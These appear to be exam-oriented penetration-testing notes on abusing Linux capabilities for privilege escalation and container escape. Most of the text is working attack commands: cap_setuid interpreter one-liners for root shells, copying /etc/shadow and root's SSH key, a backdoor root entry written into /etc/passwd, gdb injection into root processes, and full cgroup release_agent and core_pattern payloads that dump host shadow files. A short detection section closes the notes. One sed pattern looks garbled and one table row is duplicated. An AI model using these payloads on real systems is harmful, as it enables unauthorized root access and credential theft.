+++
title = 'Capabilities Abuse'
date = 2026-10-30
type = 'notes'
weight = 40
toc = true
tags = ['linux', 'privilege-escalation', 'capabilities']
+++

## What are Capabilities?

> * Linux capabilities are a security feature that allows specific privileges to be granted to processes, enabling actions that would otherwise be restricted to root.
> * Capabilities break up the monolithic root privilege into smaller, independently grantable units. Each unit can be assigned to a process or binary without granting full root.
> * One common vulnerability is using capabilities to grant privileges to processes that are not adequately sandboxed or isolated, allowing privilege escalation and access to sensitive information.
> * Another vulnerability is misuse or overuse: a process may hold more capabilities than it actually needs, widening the attack surface.

Capabilities are stored as extended attributes (`security.capability`) and are **not visible in `ls -l`** — unlike SUID, they must be enumerated with `getcap`.

---

## Capability Sets (Why `+ep` Matters)

A process carries five capability sets. Understanding them explains why some grants are exploitable and others are not:

| Set | Meaning |
|---|---|
| **Effective (`pE`)** | The capabilities the kernel actually checks at runtime. If a capability is not in this set, it grants nothing — even if the process “holds” it in Permitted. |
| **Permitted (`pP`)** | The ceiling of capabilities the process may raise into Effective. A process can move a capability from Permitted to Effective via `capset()` or `setuid()`. |
| **Inheritable (`pI`)** | Capabilities preserved across `execve()`. Largely useless on its own because file Inheritable is usually zero. |
| **Ambient (`pA`)** | Introduced in Linux 4.3. Capabilities that survive `execve()` of **non-privileged** binaries — no file capabilities or SUID required. Added to Permitted and Effective on exec. |
| **Bounding (`pB`)** | The hard ceiling: no capability outside this set can ever be acquired, even by a root process that later drops privileges. |

For **file capabilities**, the effective bit (`fE`) is a single flag that says “move the file’s Permitted set into Effective on exec.” This is why `+ep` is the exploitable combination and `+p` alone usually is not.

> **Ambient abuse note:** Ambient capabilities are explicitly designed to let unprivileged processes carry capabilities across `execve()`. The kernel developers acknowledged that ambient state is “surprisingly likely to allow setuid or file-capped programs to be exploited” if an attacker can influence it. If you find a process that can raise ambient caps (via `prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, ...)`), it can pass capabilities to every child it spawns.

---

## Capabilities Enumeration

* Enumerate all capabilities on the filesystem:
  `getcap -r / 2>/dev/null`
  * Searching only `/usr/bin`, `/usr/sbin`, etc. misses binaries in `/opt`, `/home`, `/srv`, `/usr/lib`, and custom application directories.
* Enumerate a specific binary:
  `getcap /usr/bin/binaryname`
* Inspect the raw extended attribute:
  `getfattr -m - -d /usr/bin/binaryname` — the capability lives in `security.capability`.
* Decode a capability mask:
  `capsh --decode=0000003fffffffff`
* Enumerate capabilities of running processes:
  `getpcaps <PID>` or `grep Cap /proc/<PID>/status`
* Inspect the current process’s full capability state:
  `capsh --print`

> **Warning — scripts do not carry file capabilities.** File capabilities are honored on **ELF binaries only**, not on shell or Python scripts. `setcap` on a script fails with “Operation not supported,” and executing a script via its interpreter does not inherit the interpreter’s capabilities. Look for binaries, or use the interpreter itself (e.g., `cap_setuid` on `python3`).

---

## Capability Values (File Capability Flags)

| Flag | Meaning | Exploitable? |
|---|---|---|
| `+ep` | **Effective + Permitted.** The capability is active as soon as the binary starts. This is the combination that actually grants privilege and the one to look for during enumeration. | **Yes** — direct escalation |
| `+p` | **Permitted only.** The process holds the capability but cannot use it until it raises it into the effective set (via `capset()`/`setuid()` inside the program). Most standard binaries never do this. | Usually **not** on its own. Inspect with `strings`/`ltrace` for `cap_set_proc()` or `setuid()` calls. |
| `+ei` | **Effective + Inheritable.** Effective immediately, and placed in the inheritable set so it can survive `execve()` of another binary if that binary has the corresponding inheritable bit or ambient capabilities are used. | Yes, via effective bit; inheritance is situational |
| `+i` | **Inheritable only.** No effective privilege; only useful with a capability-aware binary. | Not a direct escalation |

---

## Interesting Capabilities

| Capability | Why it matters |
|---|---|
| `CAP_SETUID` | Change effective UID — switch to root. |
| `CAP_SETGID` | Change effective GID — switch to root group. |
| `CAP_DAC_READ_SEARCH` | Bypass file read and directory search permission checks; **also enables `open_by_handle_at()`**, which can read files outside the mount namespace (Docker breakout via the shocker technique). |
| `CAP_DAC_OVERRIDE` | Bypass file read, write, and execute checks — write any file. |
| `CAP_CHOWN` | Change file ownership — take ownership of sensitive files. |
| `CAP_FOWNER` | Bypass ownership checks — `chmod u+s` on files you do not own. |
| `CAP_SETFCAP` | Set file capabilities — plant `cap_setuid+ep` on a binary you control. |
| `CAP_SYS_ADMIN` | Mount, namespace configuration, cgroup manipulation — **“the new root”**; near-total control and a standard container escape primitive. |
| `CAP_SYS_CHROOT` | Call `chroot()` — escape a chroot jail by chrooting into a subdirectory and `chdir`-ing out. |
| `CAP_SYS_PTRACE` | Attach to and debug other processes — inject into a root process with GDB. |
| `CAP_SYS_MODULE` | Load/unload kernel modules — malicious kernel module (very noisy, can crash the host). |
| `CAP_SYS_RAWIO` | Raw I/O — arbitrary read/write to devices. |
| `CAP_NET_ADMIN` | Network configuration — routing, interfaces, netfilter; enables namespace-local kernel exploits (e.g., CVE-2026-46300, CVE-2026-72018). |
| `CAP_NET_RAW` | Raw sockets — packet capture, credential sniffing. |
| `CAP_NET_BIND_SERVICE` | Bind ports below 1024 — service hijack pivot. |
| `CAP_SYS_TIME` | Modify system clock — log manipulation. |
| `CAP_SYS_RESOURCE` | Modify resource limits. |
| `CAP_BPF` / `CAP_PERFMON` | Load BPF programs / performance monitoring — kernel-level primitives. |
| `CAP_CHECKPOINT_RESTORE` | Checkpoint/restore — can bypass some namespace restrictions. |

---

## Exploiting Capabilities

Once `getcap -r / 2>/dev/null` reveals a capability, check the binary against [GTFOBins](https://gtfobins.github.io/) (each page has a **Capabilities** section) and use the capability-specific escape.

### General exploitation table

| Capability | Typical target | Exploitation |
|---|---|---|
| `cap_setuid+ep` | `python3`, `perl`, `ruby`, `node`, `php` | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` or `perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/sh";'` |
| `cap_setgid+ep` | Same interpreters | `perl -e 'use POSIX (setgid); setgid(0); exec "/bin/bash";'` |
| `cap_dac_read_search+ep` | `tar`, `cp`, `cat`, `zip` | `tar -czf /tmp/shadow.tgz /etc/shadow` then extract as your user |
| `cap_dac_override+ep` | `vim`, `nano`, `tee`, `cp` | `vim /etc/passwd` → add `pwned::0:0:root:/root:/bin/bash` → `su pwned`; or `cp /etc/shadow /tmp/shadow` |
| `cap_fowner+ep` | `chmod`, `chown` | `chmod u+s /bin/bash` — ownership check bypassed → `/bin/bash -p` |
| `cap_setfcap+ep` | `setcap` | `setcap cap_setuid+ep /tmp/evil` (copy an interpreter first), then execute it |
| `cap_chown+ep` | `chown` | Change ownership of a file you can then modify, or of a sensitive file |
| `cap_sys_admin+ep` | `mount`, `unshare` | Mount host drives, or use cgroup `release_agent` / `core_pattern` to execute on the host |
| `cap_sys_ptrace+ep` | `gdb`, `strace` | `gdb -p <root-pid>` → `call (void)system("/bin/sh")` |
| `cap_sys_chroot+ep` | `chroot` | Classic chroot escape: `chdir` to jail root, `chroot` into a subdir, then `chdir ../../..` until outside |
| `cap_sys_module+ep` | `insmod` | Malicious kernel module (avoid on exam — can panic the host) |
| `cap_net_raw+ep` | `tcpdump`, `ping` | Packet sniffing — capture credentials on the wire |
| `cap_net_admin+ep` | any binary | Network manipulation; namespace-local kernel exploits (Fragnesia, CVE-2026-46300) |
| `cap_sys_chroot+ep` | `chroot` | Chroot escape requires a second primitive (e.g., a writable directory outside the jail) |

### Worked examples

**`cap_setuid` on Python**:

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.10 = cap_setuid+ep
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
id   # uid=0(root)
```

**`cap_dac_read_search` on tar — extract `/etc/shadow`**:

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow
cd /tmp
tar -xzf shadow.tar.gz
chmod 644 /tmp/etc/shadow
```

**`cap_dac_read_search` on `tarS` — grab root’s SSH key**:

```bash
tarS -cvf id_rsa.tar /root/.ssh/id_rsa
tar -xvf id_rsa.tar -C /tmp/
ssh -i /tmp/root/.ssh/id_rsa root@localhost -p 2082
```

**`cap_dac_override` on Vim — write `/etc/passwd`**:

```bash
vim /etc/passwd
# add: pwned::0:0:root:/root:/bin/bash
su pwned
```

**`cap_sys_ptrace` on GDB — inject into a root process**:

```bash
gdb -p <root-pid>
(gdb) call (void)system("/bin/sh")
```

**`cap_sys_admin` — cgroup `release_agent` escape (container)**:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'cat /etc/shadow > '"$host_path"'/output' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

**`cap_sys_admin` — `core_pattern` escape (container, cgroups v2 / no rdma)**:

```bash
UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
printf '#!/bin/sh\ncat /etc/shadow > %s/loot\nchmod 777 %s/loot\n' "$UDIR" "$UDIR" > /exploit.sh
chmod +x /exploit.sh
echo "|${UDIR}/exploit.sh" > /proc/sys/kernel/core_pattern
ulimit -c unlimited
bash -c 'kill -11 $$'
sleep 4
cat /loot
```

**`cap_dac_read_search` — `open_by_handle_at` (shocker) for container host file read**:

Compile the shocker PoC and run it against the file you want to read from the host:

```bash
gcc shocker.c -o shocker
./shocker /etc/shadow shadow
```

### Runtime one-liners by interpreter

| Runtime | `cap_setuid` one-liner |
|---|---|
| **Python** | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| **Perl** | `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'` |
| **Ruby** | `ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'` |
| **Node.js** | `node -e 'process.setuid(0); require("child_process").execSync("/bin/bash",{stdio:"inherit"})'` |

All of these are confirmed as valid GTFOBins capability escalations.

---

## Capabilities and Chroot Escape (`CAP_SYS_CHROOT`)

A process with `CAP_SYS_CHROOT` can call `chroot()` — and **the ability to chroot implies the ability to break out of a chroot**.

Classic escape:

```c
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for (int i = 0; i < 1000; i++) {
    chdir("..");
}
chroot(".");
```

After the loop, the current working directory is outside the original jail. `chroot(".")` then sets the root to that outside directory, granting access to the real filesystem root.

This requires a writable directory outside the jail (or a directory the process can create), and is a second-order primitive: `CAP_SYS_CHROOT` alone does not give you a root shell, but it removes filesystem isolation.

---

## `CAP_SETFCAP` — Planting Capabilities

`CAP_SETFCAP` is the capability that allows setting file capabilities. If a binary with `CAP_SETFCAP` is available, you can **plant `cap_setuid+ep` on an interpreter you control**:

```bash
cp /bin/bash /tmp/evil
setcap cap_setuid+ep /tmp/evil
/tmp/evil -p
```

The kernel requires `CAP_SETFCAP` to create file capabilities, and it is also required to map UID 0 in a user namespace when writing file capabilities that the initial namespace will honor.

---

## Capabilities in Containers — Escape Primitives

Inside a container, `capsh --print` shows the current capability set. The highest-value escapes:

### `CAP_SYS_ADMIN` — “the new root”

A container holding `CAP_SYS_ADMIN` can usually escape to the host through:

1. **Mounting host block devices** — if `/dev/sd*` is visible:
   ```bash
   mkdir /mnt/host
   mount /dev/sda1 /mnt/host
   chroot /mnt/host
   ```
2. **cgroup `release_agent`** — for cgroups v1:
   The `release_agent` script runs as root on the host when a cgroup becomes empty. The full payload is shown above.
3. **`core_pattern`** — when cgroups v1 is unavailable:
   `/proc/sys/kernel/core_pattern` is **kernel-wide, not namespaced**. A pipe-prefixed pattern makes the kernel execute the script as root in the init namespace when any process crashes. The overlay `upperdir` is a real host path, so the script is accessible from the host.

### `CAP_DAC_READ_SEARCH` — shocker / `open_by_handle_at`

`CAP_DAC_READ_SEARCH` grants `open_by_handle_at(2)`, which bypasses the mount namespace boundary. The `shocker` PoC reads arbitrary host files from inside a Docker container by exploiting inode handles.

### `CAP_NET_ADMIN` — namespace-local exploit surface

`CAP_NET_ADMIN` inside a user+network namespace (`unshare -Urn`) is enough to reach kernel bugs such as **CVE-2026-46300 (Fragnesia)** and **CVE-2026-72018**, which escalate to root in the init namespace.

---

## Related Vulnerability: libcap TOCTOU (CVE-2026-4878)

A local unprivileged user with **write access to a parent directory** can exploit a TOCTOU race in libcap’s `cap_set_file()` to redirect a pending capability update to an attacker-controlled file. This injects or strips capabilities on unintended executables, leading to privilege escalation when those executables are later run by a privileged user.

This matters because `setcap` and container tooling call `cap_set_file()` on paths that may be attacker-influenced. Check the libcap version on the target if `setcap` is present.

---

## Detection and Auditing (Blue-Team Notes)

If you are writing detection rules for capabilities abuse:

- **Audit enumeration:** `getcap -r /` run by a non-administrator is a high-signal event.
- **Audit changes:** `setcap` execution or `security.capability` extended-attribute changes are rare and should be baselined.
- **Audit `setuid(0)` from non-root:** `-a always,exit -F arch=b64 -S setuid,setresuid,setreuid -F a0=0 -F auid>=1000 -F auid!=-1 -k setuid_zero`.
- **Highest-risk grants to review first:** `cap_setuid`, `cap_setgid`, `cap_dac_override`, `cap_dac_read_search`, `cap_sys_admin`, `cap_sys_ptrace`, `cap_chown`.
- **Sigma rule:** `Linux Setgid Capability Set on a Binary via Setcap Utility` detects `setcap` with `cap_setgid` on a binary.

---

## Edge Cases and Practical Notes

- **The binary must actually use the capability.** A capability on `/usr/bin/cp` is exploitable because `cp` opens the file itself. A capability on a wrapper that calls another binary is often not exploitable because the capability is not inherited by the child.
- **`+ep` is the interesting combination.** If you only see `+p`, inspect the binary with `strings` / `ltrace` to see whether it calls `cap_set_proc()` or `setuid()`.
- **Remove capabilities:** `setcap -r /path/to/binary`.
- **Do not confuse file capabilities with SUID.** Both give elevated effective privileges, but capabilities are not visible in `ls -l` and must be enumerated with `getcap`.
- **Ambient capabilities are rarely set on files** — they are set at runtime via `prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)`. If you find a process that can do this, it can pass capabilities to every child it spawns.
- **`CAP_SYS_ADMIN` is not the only container escape.** `CAP_DAC_READ_SEARCH` (shocker), `CAP_SYS_PTRACE` (host process injection), and `CAP_NET_ADMIN` (namespace-local kernel bug) are also directly useful.
- **`CAP_SYS_MODULE`** can load a kernel module, but on exam targets it is noisy and risks crashing the host. Prefer other capabilities.
- **`CAP_SYS_CHROOT` alone is not a root shell** — it removes filesystem isolation. Pair it with a writable directory or a second primitive.
